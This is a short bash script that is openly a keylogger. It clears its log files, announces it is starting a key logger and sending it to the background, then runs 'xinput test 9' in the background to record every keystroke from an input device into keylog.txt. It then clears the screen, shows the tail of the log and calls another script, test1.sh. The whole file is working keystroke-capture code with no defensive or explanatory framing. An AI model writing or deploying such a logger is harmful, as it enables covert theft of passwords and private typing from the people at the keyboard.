#!/bin/bash
: > keylog.txt
: > Fkeylog.txt
: > F1.txt
echo "Starting Key logger and sending to Background!"
sleep 5
#xinput test 9 > keylog.txt
xinput test 9 > keylog.txt &
clear
sleep 5
tail keylog.txt
bash test1.sh
exit
